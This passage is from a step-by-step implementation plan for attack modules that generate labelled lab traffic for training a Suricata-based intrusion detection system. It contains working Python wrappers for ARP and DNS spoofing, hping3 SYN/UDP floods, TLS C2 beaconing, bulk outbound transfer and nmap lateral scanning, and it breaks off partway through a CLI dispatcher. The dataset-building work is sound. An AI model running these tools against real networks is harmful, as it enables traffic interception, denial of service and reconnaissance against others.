Run: `pytest tests/training/selfcollected/attacks/test_port_scan.py -v`
Expected: 4 passed

- [ ] **Step 5: Commit**

```bash
git add training/selfcollected/attacks/port_scan.py tests/training/selfcollected/attacks/test_port_scan.py
git commit -m "feat: port_scan attack module"
```

---

### Task 8: `arp_spoof.py`

**Files:**
- Create: `training/selfcollected/attacks/arp_spoof.py`
- Test: `tests/training/selfcollected/attacks/test_arp_spoof.py`

**Interfaces:**
- Consumes: `check_tools`, `run_attack`, `AttackRecord` from the runner.
- Produces: `build_commands(interface, victim_ip, gateway_ip) -> tuple[list[str], list[str]]`,
  `parse_extra_args(extra) -> dict`,
  `run(victim_ip, attacker_ip, out_dir, gateway_ip, interface, duration=60, dry_run=False) -> AttackRecord` —
  `dns_spoof.py` (Task 9) documents a runtime dependency on this attack having been started first,
  but does not import from it.

- [ ] **Step 1: Write the failing tests**

Create `tests/training/selfcollected/attacks/test_arp_spoof.py`:
```python
from training.selfcollected.attacks.arp_spoof import build_commands, parse_extra_args, run


def test_build_commands_produces_both_directions_of_poisoning():
    poison_victim, poison_gateway = build_commands("eth0", "10.0.0.3", "10.0.0.1")
    assert poison_victim == ["arpspoof", "-i", "eth0", "-t", "10.0.0.3", "10.0.0.1"]
    assert poison_gateway == ["arpspoof", "-i", "eth0", "-t", "10.0.0.1", "10.0.0.3"]


def test_parse_extra_args_requires_gateway_and_interface():
    parsed = parse_extra_args(["--gateway-ip", "10.0.0.1", "--interface", "eth0"])
    assert parsed["gateway_ip"] == "10.0.0.1"
    assert parsed["interface"] == "eth0"
    assert parsed["duration"] == 60  # default


def test_run_dry_run_spawns_no_processes(tmp_path, monkeypatch):
    called = []
    monkeypatch.setattr(
        "training.selfcollected.attacks.arp_spoof.subprocess.Popen",
        lambda cmd, **kw: called.append(cmd),
    )
    record = run(
        "10.0.0.3", "10.0.0.2", tmp_path,
        gateway_ip="10.0.0.1", interface="eth0", dry_run=True,
    )
    assert called == []
    assert record.status == "dry_run"
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `pytest tests/training/selfcollected/attacks/test_arp_spoof.py -v`
Expected: FAIL with `ModuleNotFoundError`

- [ ] **Step 3: Implement `arp_spoof.py`**

Create `training/selfcollected/attacks/arp_spoof.py`:
```python
"""ARP spoofing attack (FR-2.5, §5.4.3). Wraps arpspoof (dsniff).

NOTE: this attack is deliberately NOT detected by Suricata (§5.4.3 — ARP sits
below the IP layer). dns_spoof.py depends on this attack already poisoning the
victim's ARP cache so the attacker is on-path; the two are not auto-chained.
"""

import subprocess
import time
from pathlib import Path

from training.selfcollected.attacks.common.runner import (
    AttackRecord, check_tools, run_attack,
)


def build_commands(interface: str, victim_ip: str, gateway_ip: str) -> tuple[list[str], list[str]]:
    poison_victim = ["arpspoof", "-i", interface, "-t", victim_ip, gateway_ip]
    poison_gateway = ["arpspoof", "-i", interface, "-t", gateway_ip, victim_ip]
    return poison_victim, poison_gateway


def parse_extra_args(extra: list[str]) -> dict:
    parsed = {"gateway_ip": None, "interface": None, "duration": 60}
    it = iter(extra)
    for arg in it:
        if arg == "--gateway-ip":
            parsed["gateway_ip"] = next(it)
        elif arg == "--interface":
            parsed["interface"] = next(it)
        elif arg == "--duration":
            parsed["duration"] = float(next(it))
    if parsed["gateway_ip"] is None or parsed["interface"] is None:
        raise ValueError("arp_spoof requires --gateway-ip and --interface")
    return parsed


def run(
    victim_ip: str,
    attacker_ip: str,
    out_dir: Path,
    gateway_ip: str,
    interface: str,
    duration: float = 60,
    dry_run: bool = False,
) -> AttackRecord:
    params = {"gateway_ip": gateway_ip, "interface": interface, "duration": duration}

    def body():
        check_tools(["arpspoof"])
        cmd_victim, cmd_gateway = build_commands(interface, victim_ip, gateway_ip)
        proc_victim = subprocess.Popen(cmd_victim)
        proc_gateway = subprocess.Popen(cmd_gateway)
        try:
            time.sleep(duration)
        finally:
            for proc in (proc_victim, proc_gateway):
                proc.terminate()
            for proc in (proc_victim, proc_gateway):
                try:
                    proc.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    proc.kill()
                    proc.wait()

    return run_attack("arp_spoof", "arpspoof", attacker_ip, victim_ip, out_dir, params, body, dry_run)
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `pytest tests/training/selfcollected/attacks/test_arp_spoof.py -v`
Expected: 3 passed

- [ ] **Step 5: Commit**

```bash
git add training/selfcollected/attacks/arp_spoof.py tests/training/selfcollected/attacks/test_arp_spoof.py
git commit -m "feat: arp_spoof attack module"
```

---

### Task 9: `dns_spoof.py`

**Files:**
- Create: `training/selfcollected/attacks/dns_spoof.py`
- Create: `training/selfcollected/attacks/dns_spoof_hosts.example` (example dnsspoof hosts file)
- Test: `tests/training/selfcollected/attacks/test_dns_spoof.py`

**Interfaces:**
- Consumes: `check_tools`, `run_attack`, `run_timed_subprocess`, `AttackRecord` from the runner.
- Produces: `build_command(interface, hosts_file) -> list[str]`, `parse_extra_args(extra) -> dict`,
  `run(victim_ip, attacker_ip, out_dir, interface, hosts_file, duration=60, dry_run=False) -> AttackRecord`.

- [ ] **Step 1: Write the failing tests**

Create `tests/training/selfcollected/attacks/test_dns_spoof.py`:
```python
from training.selfcollected.attacks.dns_spoof import build_command, parse_extra_args, run


def test_build_command_produces_expected_dnsspoof_invocation():
    cmd = build_command("eth0", "/tmp/hosts.txt")
    assert cmd == ["dnsspoof", "-i", "eth0", "-f", "/tmp/hosts.txt"]


def test_parse_extra_args_requires_interface_and_hosts_file():
    parsed = parse_extra_args(["--interface", "eth0", "--hosts-file", "/tmp/hosts.txt"])
    assert parsed["interface"] == "eth0"
    assert parsed["hosts_file"] == "/tmp/hosts.txt"
    assert parsed["duration"] == 60


def test_run_records_the_arp_spoof_prerequisite_in_params(tmp_path, monkeypatch):
    monkeypatch.setattr(
        "training.selfcollected.attacks.dns_spoof.run_timed_subprocess",
        lambda cmd, duration: None,
    )
    record = run(
        "10.0.0.3", "10.0.0.2", tmp_path,
        interface="eth0", hosts_file="/tmp/hosts.txt",
    )
    assert "arp_spoof" in record.params["prerequisite"]
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `pytest tests/training/selfcollected/attacks/test_dns_spoof.py -v`
Expected: FAIL with `ModuleNotFoundError`

- [ ] **Step 3: Implement `dns_spoof.py` and the example hosts file**

Create `training/selfcollected/attacks/dns_spoof_hosts.example`:
```
# dnsspoof hosts file format: one "ip   hostname" pair per line.
# Example: redirect the victim's resolution of a benign-looking domain to the attacker.
10.0.0.2    example-lab-target.local
```

Create `training/selfcollected/attacks/dns_spoof.py`:
```python
"""DNS spoofing attack (FR-2.4, Table 5.4). Wraps dnsspoof (dsniff).

REQUIRES arp_spoof.py to already be running against the same victim/gateway pair
so the attacker is on-path to see and answer the victim's DNS queries. The two
attacks are not auto-chained; run arp_spoof first.
"""

from pathlib import Path

from training.selfcollected.attacks.common.runner import (
    AttackRecord, check_tools, run_attack, run_timed_subprocess,
)


def build_command(interface: str, hosts_file: str) -> list[str]:
    return ["dnsspoof", "-i", interface, "-f", hosts_file]


def parse_extra_args(extra: list[str]) -> dict:
    parsed = {"interface": None, "hosts_file": None, "duration": 60}
    it = iter(extra)
    for arg in it:
        if arg == "--interface":
            parsed["interface"] = next(it)
        elif arg == "--hosts-file":
            parsed["hosts_file"] = next(it)
        elif arg == "--duration":
            parsed["duration"] = float(next(it))
    if parsed["interface"] is None or parsed["hosts_file"] is None:
        raise ValueError("dns_spoof requires --interface and --hosts-file")
    return parsed


def run(
    victim_ip: str,
    attacker_ip: str,
    out_dir: Path,
    interface: str,
    hosts_file: str,
    duration: float = 60,
    dry_run: bool = False,
) -> AttackRecord:
    params = {
        "interface": interface,
        "hosts_file": hosts_file,
        "duration": duration,
        "prerequisite": "arp_spoof must already be running to put the attacker on-path",
    }

    def body():
        check_tools(["dnsspoof"])
        run_timed_subprocess(build_command(interface, hosts_file), duration)

    return run_attack("dns_spoof", "dnsspoof", attacker_ip, victim_ip, out_dir, params, body, dry_run)
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `pytest tests/training/selfcollected/attacks/test_dns_spoof.py -v`
Expected: 3 passed

- [ ] **Step 5: Commit**

```bash
git add training/selfcollected/attacks/dns_spoof.py training/selfcollected/attacks/dns_spoof_hosts.example tests/training/selfcollected/attacks/test_dns_spoof.py
git commit -m "feat: dns_spoof attack module"
```

---

### Task 10: `syn_flood.py` and `ddos.py`

**Files:**
- Create: `training/selfcollected/attacks/syn_flood.py`
- Create: `training/selfcollected/attacks/ddos.py`
- Test: `tests/training/selfcollected/attacks/test_syn_flood.py`
- Test: `tests/training/selfcollected/attacks/test_ddos.py`

**Interfaces:**
- Consumes: `check_tools`, `run_attack`, `run_timed_subprocess`, `AttackRecord` from the runner.
- Produces: `syn_flood.build_command(victim_ip, port) -> list[str]`,
  `syn_flood.run(victim_ip, attacker_ip, out_dir, port=80, duration=30, dry_run=False)`,
  `ddos.build_command(victim_ip, port) -> list[str]`,
  `ddos.run(victim_ip, attacker_ip, out_dir, port=80, duration=30, dry_run=False)`.

- [ ] **Step 1: Write the failing tests**

Create `tests/training/selfcollected/attacks/test_syn_flood.py`:
```python
from training.selfcollected.attacks.syn_flood import build_command, parse_extra_args, run


def test_build_command_is_a_tcp_syn_flood():
    cmd = build_command("10.0.0.3", 80)
    assert cmd == ["hping3", "-S", "--flood", "-V", "-p", "80", "10.0.0.3"]


def test_parse_extra_args_defaults():
    assert parse_extra_args([]) == {"port": 80, "duration": 30}


def test_run_dry_run_skips_execution(tmp_path, monkeypatch):
    called = []
    monkeypatch.setattr(
        "training.selfcollected.attacks.syn_flood.run_timed_subprocess",
        lambda cmd, duration: called.append(cmd),
    )
    record = run("10.0.0.3", "10.0.0.2", tmp_path, dry_run=True)
    assert called == []
    assert record.status == "dry_run"
```

Create `tests/training/selfcollected/attacks/test_ddos.py`:
```python
from training.selfcollected.attacks.ddos import build_command, parse_extra_args, run


def test_build_command_is_a_udp_flood_and_differs_from_syn_flood():
    cmd = build_command("10.0.0.3", 80)
    assert cmd == ["hping3", "--udp", "--flood", "-V", "-p", "80", "10.0.0.3"]


def test_parse_extra_args_defaults():
    assert parse_extra_args([]) == {"port": 80, "duration": 30}


def test_run_dry_run_skips_execution(tmp_path, monkeypatch):
    called = []
    monkeypatch.setattr(
        "training.selfcollected.attacks.ddos.run_timed_subprocess",
        lambda cmd, duration: called.append(cmd),
    )
    record = run("10.0.0.3", "10.0.0.2", tmp_path, dry_run=True)
    assert called == []
    assert record.status == "dry_run"
    assert "single-attacker volumetric flood" in record.notes
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `pytest tests/training/selfcollected/attacks/test_syn_flood.py tests/training/selfcollected/attacks/test_ddos.py -v`
Expected: FAIL with `ModuleNotFoundError` (both files)

- [ ] **Step 3: Implement `syn_flood.py`**

Create `training/selfcollected/attacks/syn_flood.py`:
```python
"""SYN flood / DoS attack (Table 5.4). Wraps hping3 (TCP SYN flood)."""

from pathlib import Path

from training.selfcollected.attacks.common.runner import (
    AttackRecord, check_tools, run_attack, run_timed_subprocess,
)


def build_command(victim_ip: str, port: int) -> list[str]:
    return ["hping3", "-S", "--flood", "-V", "-p", str(port), victim_ip]


def parse_extra_args(extra: list[str]) -> dict:
    parsed = {"port": 80, "duration": 30}
    it = iter(extra)
    for arg in it:
        if arg == "--port":
            parsed["port"] = int(next(it))
        elif arg == "--duration":
            parsed["duration"] = float(next(it))
    return parsed


def run(
    victim_ip: str,
    attacker_ip: str,
    out_dir: Path,
    port: int = 80,
    duration: float = 30,
    dry_run: bool = False,
) -> AttackRecord:
    params = {"port": port, "duration": duration}

    def body():
        check_tools(["hping3"])
        run_timed_subprocess(build_command(victim_ip, port), duration)

    return run_attack("syn_flood", "hping3", attacker_ip, victim_ip, out_dir, params, body, dry_run)
```

- [ ] **Step 4: Implement `ddos.py`**

Create `training/selfcollected/attacks/ddos.py`:
```python
"""DDoS attack (taxonomy Table 5.2). Wraps hping3 (UDP flood).

NOTE: with a single attacker VM this is a single-source volumetric flood, not a
truly distributed attack. Every record from this module notes that explicitly
so downstream labelling/evaluation doesn't overclaim.
"""

from pathlib import Path

from training.selfcollected.attacks.common.runner import (
    AttackRecord, check_tools, run_attack, run_timed_subprocess,
)

SINGLE_SOURCE_NOTE = "single-attacker volumetric flood, not distributed"


def build_command(victim_ip: str, port: int) -> list[str]:
    return ["hping3", "--udp", "--flood", "-V", "-p", str(port), victim_ip]


def parse_extra_args(extra: list[str]) -> dict:
    parsed = {"port": 80, "duration": 30}
    it = iter(extra)
    for arg in it:
        if arg == "--port":
            parsed["port"] = int(next(it))
        elif arg == "--duration":
            parsed["duration"] = float(next(it))
    return parsed


def run(
    victim_ip: str,
    attacker_ip: str,
    out_dir: Path,
    port: int = 80,
    duration: float = 30,
    dry_run: bool = False,
) -> AttackRecord:
    params = {"port": port, "duration": duration}

    def body():
        check_tools(["hping3"])
        run_timed_subprocess(build_command(victim_ip, port), duration)

    record = run_attack("ddos", "hping3", attacker_ip, victim_ip, out_dir, params, body, dry_run)
    record.notes = SINGLE_SOURCE_NOTE
    return record
```

- [ ] **Step 5: Run tests to verify they pass**

Run: `pytest tests/training/selfcollected/attacks/test_syn_flood.py tests/training/selfcollected/attacks/test_ddos.py -v`
Expected: 6 passed

- [ ] **Step 6: Commit**

```bash
git add training/selfcollected/attacks/syn_flood.py training/selfcollected/attacks/ddos.py tests/training/selfcollected/attacks/test_syn_flood.py tests/training/selfcollected/attacks/test_ddos.py
git commit -m "feat: syn_flood and ddos attack modules"
```

---

### Task 11: `ja3_c2.py`

**Files:**
- Create: `training/selfcollected/attacks/ja3_c2.py`
- Test: `tests/training/selfcollected/attacks/test_ja3_c2.py`

**Interfaces:**
- Consumes: `run_attack`, `AttackRecord` from the runner. (`start_listener` and
  `generate_self_signed_cert` from Task 5's `listener.py` are consumed only by this task's own
  test, as a fixture to connect against — `ja3_c2.py` itself is a plain TLS client and does not
  import them; it connects to whatever `listener_host`/`listener_port` it's given.)
- Produces: `connect(victim_ip_or_listener_host, port) -> str` (returns the negotiated TLS
  version string, used as evidence the handshake completed),
  `run(victim_ip, attacker_ip, out_dir, listener_host="127.0.0.1", listener_port=8443, dry_run=False) -> AttackRecord`.

**Scope note (carried from the design doc):** this module does not attempt to craft a TLS
ClientHello matching one specific pre-known malicious JA3 hash — doing that precisely requires
raw packet construction this plan can't verify without a live run. Instead it performs a normal
Python `ssl` TLS handshake, whose JA3 naturally differs from mainstream browsers (the same
property that makes this detection technique work against real malware). Step 6 below is a
one-time manual step to capture that resulting hash and complete Task 1's commented-out
Suricata rule.

- [ ] **Step 1: Write the failing tests**

Create `tests/training/selfcollected/attacks/test_ja3_c2.py`:
```python
import time

from training.selfcollected.attacks.common.listener import (
    generate_self_signed_cert, start_listener,
)
from training.selfcollected.attacks.ja3_c2 import connect, run


def test_connect_returns_a_tls_version_string(tmp_path):
    cert_path = tmp_path / "cert.pem"
    key_path = tmp_path / "key.pem"
    generate_self_signed_cert(cert_path, key_path)
    start_listener("127.0.0.1", 8444, cert_path, key_path)
    time.sleep(0.2)

    version = connect("127.0.0.1", 8444)
    assert version is not None and "TLS" in version


def test_run_dry_run_does_not_connect(tmp_path, monkeypatch):
    called = []
    monkeypatch.setattr(
        "training.selfcollected.attacks.ja3_c2.connect",
        lambda host, port: called.append((host, port)) or "TLSv1.3",
    )
    record = run("10.0.0.3", "10.0.0.2", tmp_path, dry_run=True)
    assert called == []
    assert record.status == "dry_run"
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `pytest tests/training/selfcollected/attacks/test_ja3_c2.py -v`
Expected: FAIL with `ModuleNotFoundError`

- [ ] **Step 3: Implement `ja3_c2.py`**

Create `training/selfcollected/attacks/ja3_c2.py`:
```python
"""Known-bad-JA3 C2 attack (Table 5.4).

Performs a normal Python `ssl` TLS handshake to an attacker-controlled listener.
Its JA3 fingerprint naturally differs from mainstream browsers (no special
crafting needed — this is also why this detection method works against real
malware). See this module's module-level docstring note in the implementation
plan for why a specific pre-known hash is not targeted.
"""

import socket
import ssl
from pathlib import Path

from training.selfcollected.attacks.common.runner import (
    AttackRecord, run_attack,
)


def connect(host: str, port: int) -> str:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    with socket.create_connection((host, port), timeout=5) as sock:
        with ctx.wrap_socket(sock, server_hostname=host) as tls_sock:
            return tls_sock.version()


def run(
    victim_ip: str,
    attacker_ip: str,
    out_dir: Path,
    listener_host: str = "127.0.0.1",
    listener_port: int = 8443,
    dry_run: bool = False,
) -> AttackRecord:
    params = {"listener_host": listener_host, "listener_port": listener_port}

    def body():
        connect(listener_host, listener_port)

    return run_attack("ja3_c2", "python-ssl", attacker_ip, victim_ip, out_dir, params, body, dry_run)
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `pytest tests/training/selfcollected/attacks/test_ja3_c2.py -v`
Expected: 2 passed

- [ ] **Step 5: Commit**

```bash
git add training/selfcollected/attacks/ja3_c2.py tests/training/selfcollected/attacks/test_ja3_c2.py
git commit -m "feat: ja3_c2 attack module"
```

- [ ] **Step 6: One-time manual calibration (run once against the live lab, not part of the test suite)**

1. Start the listener and capture Suricata's TLS log for one `ja3_c2` run:
   ```bash
   sudo suricata -c nidps/suricata/suricata.yaml -i <host-only-interface> -l /tmp/ja3-calib
   python3 -m training.selfcollected.attacks.run_attack ja3_c2 --attacker-ip <victim-A-ip> --victim-ip <listener-ip> --out-dir /tmp/ja3-calib
   ```
2. Find the resulting JA3 hash in `/tmp/ja3-calib/eve.json` (look for an event with
   `event_type: "tls"` and a `ja3.hash` field).
3. Uncomment and fill in the JA3 rule in `nidps/suricata/custom.rules` (Task 1, Step 3) with that
   hash, then re-run `suricata -T` (Task 1, Step 5) to confirm the rule parses.
4. Commit the filled-in rule:
   ```bash
   git add nidps/suricata/custom.rules
   git commit -m "chore: fill in known-bad JA3 hash from one-time lab calibration"
   ```

---

### Task 12: `c2_beacon.py`

**Files:**
- Create: `training/selfcollected/attacks/c2_beacon.py`
- Test: `tests/training/selfcollected/attacks/test_c2_beacon.py`

**Interfaces:**
- Consumes: `run_attack`, `AttackRecord` from the runner; `connect` from Task 11 (reused as the
  per-beacon connection primitive).
- Produces: `jitter_intervals(base_interval, jitter_fraction, count, rng) -> list[float]`,
  `run(victim_ip, attacker_ip, out_dir, listener_host="127.0.0.1", listener_port=8443, base_interval=5.0, jitter_fraction=0.1, count=5, dry_run=False) -> AttackRecord`.

- [ ] **Step 1: Write the failing tests**

Create `tests/training/selfcollected/attacks/test_c2_beacon.py`:
```python
import random

from training.selfcollected.attacks.c2_beacon import jitter_intervals, run


def test_jitter_intervals_stays_within_expected_bounds():
    rng = random.Random(42)
    intervals = jitter_intervals(base_interval=10.0, jitter_fraction=0.2, count=50, rng=rng)
    assert len(intervals) == 50
    for interval in intervals:
        assert 8.0 <= interval <= 12.0  # 10 +/- 20%


def test_jitter_intervals_is_reproducible_with_same_seed():
    rng1 = random.Random(7)
    rng2 = random.Random(7)
    assert jitter_intervals(5.0, 0.1, 10, rng1) == jitter_intervals(5.0, 0.1, 10, rng2)


def test_run_dry_run_sends_no_beacons(tmp_path, monkeypatch):
    called = []
    monkeypatch.setattr(
        "training.selfcollected.attacks.c2_beacon.connect",
        lambda host, port: called.append((host, port)),
    )
    record = run("10.0.0.3", "10.0.0.2", tmp_path, dry_run=True)
    assert called == []
    assert record.status == "dry_run"


def test_run_sends_count_beacons(tmp_path, monkeypatch):
    called = []
    monkeypatch.setattr(
        "training.selfcollected.attacks.c2_beacon.connect",
        lambda host, port: called.append((host, port)) or "TLSv1.3",
    )
    monkeypatch.setattr("time.sleep", lambda s: None)  # don't actually wait in tests
    record = run("10.0.0.3", "10.0.0.2", tmp_path, count=3)
    assert len(called) == 3
    assert record.params["beacons_sent"] == 3
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `pytest tests/training/selfcollected/attacks/test_c2_beacon.py -v`
Expected: FAIL with `ModuleNotFoundError`

- [ ] **Step 3: Implement `c2_beacon.py`**

Create `training/selfcollected/attacks/c2_beacon.py`:
```python
"""C2 beaconing attack (§5.5.4). Periodic low-jitter connections to a listener."""

import random
import time
from pathlib import Path

from training.selfcollected.attacks.common.runner import (
    AttackRecord, run_attack,
)
from training.selfcollected.attacks.ja3_c2 import connect


def jitter_intervals(
    base_interval: float, jitter_fraction: float, count: int, rng: random.Random,
) -> list[float]:
    return [
        base_interval + rng.uniform(-1, 1) * jitter_fraction * base_interval
        for _ in range(count)
    ]


def run(
    victim_ip: str,
    attacker_ip: str,
    out_dir: Path,
    listener_host: str = "127.0.0.1",
    listener_port: int = 8443,
    base_interval: float = 5.0,
    jitter_fraction: float = 0.1,
    count: int = 5,
    dry_run: bool = False,
) -> AttackRecord:
    params = {
        "listener_host": listener_host, "listener_port": listener_port,
        "base_interval": base_interval, "jitter_fraction": jitter_fraction, "count": count,
    }
    sent = {"n": 0}

    def body():
        rng = random.Random()
        intervals = jitter_intervals(base_interval, jitter_fraction, count, rng)
        for interval in intervals:
            connect(listener_host, listener_port)
            sent["n"] += 1
            time.sleep(interval)

    record = run_attack("c2_beacon", "python-ssl", attacker_ip, victim_ip, out_dir, params, body, dry_run)
    record.params["beacons_sent"] = sent["n"]
    return record
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `pytest tests/training/selfcollected/attacks/test_c2_beacon.py -v`
Expected: 4 passed

- [ ] **Step 5: Commit**

```bash
git add training/selfcollected/attacks/c2_beacon.py tests/training/selfcollected/attacks/test_c2_beacon.py
git commit -m "feat: c2_beacon attack module"
```

---

### Task 13: `exfiltration.py`

**Files:**
- Create: `training/selfcollected/attacks/exfiltration.py`
- Test: `tests/training/selfcollected/attacks/test_exfiltration.py`

**Interfaces:**
- Consumes: `run_attack`, `AttackRecord` from the runner.
- Produces: `build_payload(size_bytes) -> bytes`,
  `run(victim_ip, attacker_ip, out_dir, listener_host="127.0.0.1", listener_port=8443, size_bytes=10_000_000, dry_run=False) -> AttackRecord`.

- [ ] **Step 1: Write the failing tests**

Create `tests/training/selfcollected/attacks/test_exfiltration.py`:
```python
from training.selfcollected.attacks.exfiltration import build_payload, run


def test_build_payload_has_exact_requested_size():
    payload = build_payload(1024)
    assert len(payload) == 1024


def test_run_dry_run_does_not_send(tmp_path, monkeypatch):
    called = []
    monkeypatch.setattr(
        "training.selfcollected.attacks.exfiltration._send",
        lambda host, port, payload: called.append(len(payload)),
    )
    record = run("10.0.0.3", "10.0.0.2", tmp_path, dry_run=True)
    assert called == []
    assert record.status == "dry_run"


def test_run_sends_requested_size(tmp_path, monkeypatch):
    sent = []
    monkeypatch.setattr(
        "training.selfcollected.attacks.exfiltration._send",
        lambda host, port, payload: sent.append(len(payload)),
    )
    record = run("10.0.0.3", "10.0.0.2", tmp_path, size_bytes=2048)
    assert sent == [2048]
    assert record.params["size_bytes"] == 2048
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `pytest tests/training/selfcollected/attacks/test_exfiltration.py -v`
Expected: FAIL with `ModuleNotFoundError`

- [ ] **Step 3: Implement `exfiltration.py`**

Create `training/selfcollected/attacks/exfiltration.py`:
```python
"""Data exfiltration attack (§5.5.3). Large/unusual outbound transfer to a listener."""

import socket
import ssl
from pathlib import Path

from training.selfcollected.attacks.common.runner import (
    AttackRecord, run_attack,
)


def build_payload(size_bytes: int) -> bytes:
    return b"X" * size_bytes


def _send(host: str, port: int, payload: bytes) -> None:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    with socket.create_connection((host, port), timeout=10) as sock:
        with ctx.wrap_socket(sock, server_hostname=host) as tls_sock:
            request = (
                f"POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: {len(payload)}\r\n\r\n"
            ).encode("ascii") + payload
            tls_sock.sendall(request)


def run(
    victim_ip: str,
    attacker_ip: str,
    out_dir: Path,
    listener_host: str = "127.0.0.1",
    listener_port: int = 8443,
    size_bytes: int = 10_000_000,
    dry_run: bool = False,
) -> AttackRecord:
    params = {"listener_host": listener_host, "listener_port": listener_port, "size_bytes": size_bytes}

    def body():
        payload = build_payload(size_bytes)
        _send(listener_host, listener_port, payload)

    return run_attack("exfiltration", "python-ssl", attacker_ip, victim_ip, out_dir, params, body, dry_run)
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `pytest tests/training/selfcollected/attacks/test_exfiltration.py -v`
Expected: 3 passed

- [ ] **Step 5: Commit**

```bash
git add training/selfcollected/attacks/exfiltration.py tests/training/selfcollected/attacks/test_exfiltration.py
git commit -m "feat: exfiltration attack module"
```

---

### Task 14: `lateral_movement.py`

**Files:**
- Create: `training/selfcollected/attacks/lateral_movement.py`
- Test: `tests/training/selfcollected/attacks/test_lateral_movement.py`

**Interfaces:**
- Consumes: `check_tools`, `run_attack`, `run_subprocess`, `AttackRecord` from the runner.
- Produces: `build_command(target_ip, ports) -> list[str]`, `parse_extra_args(extra) -> dict`,
  `run(victim_ip, attacker_ip, out_dir, ports="1-1000", dry_run=False) -> AttackRecord`.

**Operational note (carried from the spec):** this module must be run with Python executing ON
victim-A (e.g. by cloning this repo there, or piping it over SSH) — it is not remotely
orchestrated. In the shared `attacks.jsonl` schema, `attacker_ip` here is victim-A's own address
(the compromised internal host), and `victim_ip` is victim-B (the second internal target) — this
is what makes the traffic internally-sourced, matching the taxonomy's "internal scanning after
compromise" definition rather than looking like external recon.

- [ ] **Step 1: Write the failing tests**

Create `tests/training/selfcollected/attacks/test_lateral_movement.py`:
```python
from training.selfcollected.attacks.lateral_movement import build_command, parse_extra_args, run


def test_build_command_scans_the_target_with_service_enumeration():
    cmd = build_command("10.0.0.4", "1-1000")
    assert cmd == ["nmap", "-sS", "-sV", "-p", "1-1000", "10.0.0.4"]


def test_parse_extra_args_defaults():
    assert parse_extra_args([]) == {"ports": "1-1000"}


def test_run_dry_run_does_not_scan(tmp_path, monkeypatch):
    called = []
    monkeypatch.setattr(
        "training.selfcollected.attacks.lateral_movement.run_subprocess",
        lambda cmd: called.append(cmd),
    )
    record = run("10.0.0.4", "10.0.0.3", tmp_path, dry_run=True)
    assert called == []
    assert record.status == "dry_run"
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `pytest tests/training/selfcollected/attacks/test_lateral_movement.py -v`
Expected: FAIL with `ModuleNotFoundError`

- [ ] **Step 3: Implement `lateral_movement.py`**

Create `training/selfcollected/attacks/lateral_movement.py`:
```python
"""Lateral movement / infiltration attack (taxonomy Table 5.2, §3.2 infiltration review).

Run this module's `run()` with Python executing ON victim-A (the already-compromised
internal host), targeting victim-B (a second internal host). This is what distinguishes
this traffic from plain external reconnaissance: the source address is internal.
"""

from pathlib import Path

from training.selfcollected.attacks.common.runner import (
    AttackRecord, check_tools, run_attack, run_subprocess,
)


def build_command(target_ip: str, ports: str) -> list[str]:
    return ["nmap", "-sS", "-sV", "-p", ports, target_ip]


def parse_extra_args(extra: list[str]) -> dict:
    parsed = {"ports": "1-1000"}
    it = iter(extra)
    for arg in it:
        if arg == "--ports":
            parsed["ports"] = next(it)
    return parsed


def run(
    victim_ip: str,
    attacker_ip: str,
    out_dir: Path,
    ports: str = "1-1000",
    dry_run: bool = False,
) -> AttackRecord:
    params = {"ports": ports, "topology_note": "attacker_ip is victim-A (compromised internal host)"}

    def body():
        check_tools(["nmap"])
        run_subprocess(build_command(victim_ip, ports))

    return run_attack("lateral_movement", "nmap", attacker_ip, victim_ip, out_dir, params, body, dry_run)
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `pytest tests/training/selfcollected/attacks/test_lateral_movement.py -v`
Expected: 3 passed

- [ ] **Step 5: Commit**

```bash
git add training/selfcollected/attacks/lateral_movement.py tests/training/selfcollected/attacks/test_lateral_movement.py
git commit -m "feat: lateral_movement attack module"
```

---

### Task 15: `run_attack.py` CLI dispatcher

**Files:**
- Create: `training/selfcollected/attacks/run_attack.py`
- Test: `tests/training/selfcollected/attacks/test_run_attack_cli.py`

**Interfaces:**
- Consumes: `run(...)` from every module built in Tasks 6-14, and `parse_extra_args(...)` from
  the 7 of those 10 that define it (`ssh_bruteforce`, `port_scan`, `arp_spoof`, `dns_spoof`,
  `syn_flood`, `ddos`, `lateral_movement`). `ja3_c2`, `c2_beacon`, and `exfiltration` have no
  `parse_extra_args` — the dispatcher checks `hasattr(module, "parse_extra_args")` and falls
  back to `{}` (their own `run()` defaults) for those three.
- Produces: `main(argv=None) -> int`, the single entrypoint used manually from the command line
  and by Task 18's capture pipeline.

- [ ] **Step 1: Write the failing tests**

Create `tests/training/selfcollected/attacks/test_run_attack_cli.py`:
```python
from training.selfcollected.attacks.run_attack import ATTACKS, main


def test_all_ten_attacks_are_registered():
    assert set(ATTACKS) == {
        "ssh_bruteforce", "port_scan", "arp_spoof", "dns_spoof", "syn_flood",
        "ja3_c2", "c2_beacon", "exfiltration", "ddos", "lateral_movement",
    }


def test_main_dry_run_exits_zero(tmp_path, capsys):
    exit_code = main([
        "port_scan", "--attacker-ip", "10.0.0.2", "--victim-ip", "10.0.0.3",
        "--out-dir", str(tmp_path), "--dry-run",
    ])
    assert exit_code == 0
    captured = capsys.readouterr()
    assert "dry_run" in captured.out
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `pytest tests/training/selfcollected/attacks/test_run_attack_cli.py -v`
Expected: FAIL with `ModuleNotFoundError`

- [ ] **Step 3: Implement `run_attack.py`**

Create `training/selfcollected/attacks/run_attack.py`:
```python
"""CLI dispatcher: `python3 -m training.selfcollected.attacks.run_attack <attack> ...`"""

import argparse
import sys
from pathlib import Path

from training.selfcollected.attacks import (
    ssh_bruteforce, port_scan, arp_spoof, dns_spoof, syn_flood,
